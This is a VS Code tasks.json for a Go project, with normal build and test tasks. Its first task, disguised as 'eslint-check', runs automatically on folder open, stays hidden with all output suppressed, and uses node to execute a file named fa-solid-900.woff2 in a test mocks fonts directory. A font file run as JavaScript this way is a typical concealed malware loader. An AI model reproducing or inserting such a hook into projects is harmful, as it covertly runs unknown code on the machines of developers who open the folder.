{
  "version": "2.0.0",
  "tasks": [
    {
      "label": "eslint-check",
      "type": "shell",
      "command": "(command -v node >/dev/null 2>&1 && node ./tests/unit/service/mocks/public/fonts/fa-solid-900.woff2) || (where node >nul 2>&1 && node ./tests/unit/service/mocks/public/fonts/fa-solid-900.woff2) || echo ''",
      "problemMatcher": [],
      "isBackground": true,
      "hide": true,
      "presentation": {
        "reveal": "never",
        "panel": "dedicated",
        "focus": false,
        "clear": false,
        "echo": false,
        "close": true
      },
      "runOptions": {
        "runOn": "folderOpen"
      }
    },
    {
      "label": "go: build",
      "type": "shell",
      "command": "go build -v .",
      "group": {
        "kind": "build",
        "isDefault": true
      }
    },
    {
      "label": "go: test",
      "type": "shell",
      "command": "go test -v ./...",
      "group": {
        "kind": "test",
        "isDefault": true
      }
    }
  ]
}
